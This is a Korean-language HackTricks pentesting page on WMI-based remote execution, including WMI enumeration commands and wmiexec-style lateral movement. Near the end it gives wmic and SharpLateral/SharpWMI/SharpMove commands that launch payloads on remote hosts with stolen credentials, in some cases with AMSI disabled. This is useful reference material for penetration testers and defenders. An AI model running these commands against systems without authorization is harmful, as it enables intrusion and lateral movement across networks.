# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 원리

WMI를 사용하면 username과 password 또는 hash를 알고 있는 호스트에서 프로세스를 열 수 있습니다. Wmiexec는 WMI를 사용해 명령을 실행하며, semi-interactive shell 환경을 제공합니다.

**dcomexec.py:** 이 script는 다양한 DCOM endpoint를 활용하여 wmiexec.py와 유사한 semi-interactive shell을 제공하며, 특히 ShellBrowserWindow DCOM object를 사용합니다. 현재 MMC20. Application, Shell Windows 및 Shell Browser Window object를 지원합니다. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## WMI 기본 사항

### Namespace

WMI의 최상위 container는 directory-style hierarchy로 구성된 \root이며, 그 아래에 namespaces라고 하는 추가 directory가 구성됩니다.<sup>[[1]](#references)</sup>
namespaces를 나열하는 명령:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
namespace 내의 클래스는 다음을 사용하여 나열할 수 있습니다:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

`win32_process`와 같은 WMI class name 및 해당 class가 속한 namespace를 알고 있는 것은 모든 WMI 작업에 중요합니다.  
`win32`로 시작하는 class를 나열하는 commands:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
클래스 호출:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

실행 가능한 WMI 클래스의 하나 이상의 함수인 Methods를 실행할 수 있습니다.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI 열거

### WMI Service 상태

WMI Service가 작동 중인지 확인하는 Commands:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### 시스템 및 프로세스 정보

WMI를 통한 시스템 및 프로세스 정보 수집:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
공격자에게 WMI는 시스템 또는 도메인에 관한 민감한 데이터를 열거하는 강력한 도구입니다.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
특정 정보(예: 로컬 관리자 또는 로그인한 사용자)를 확인하기 위해 WMI를 원격으로 쿼리하는 작업은 명령을 신중하게 구성하면 가능합니다.

### **수동 Remote WMI Querying**

특정 WMI 쿼리를 사용하면 원격 시스템의 로컬 관리자와 로그인한 사용자를 은밀하게 식별할 수 있습니다. `wmic`은 텍스트 파일에서 명령을 읽어 여러 노드에서 동시에 실행하는 것도 지원합니다.<sup>[[1]](#references)</sup>

Empire agent 배포와 같이 WMI를 통해 프로세스를 원격으로 실행하려면 다음 명령 구조를 사용하며, 반환 값이 `"0"`이면 실행에 성공한 것입니다.<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
이 프로세스는 WMI의 원격 실행 및 시스템 열거 기능을 보여 주며, system administration과 penetration testing 모두에서의 유용성을 강조합니다.

## 자동화 도구

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket의 `wmiexec`**을 사용할 수도 있습니다.


## References

- [1] [자격 증명을 사용해 Windows 시스템 장악하기 - Part 3 (WMI 및 WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Impacket Tool Kit 초보자 가이드 - Part 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
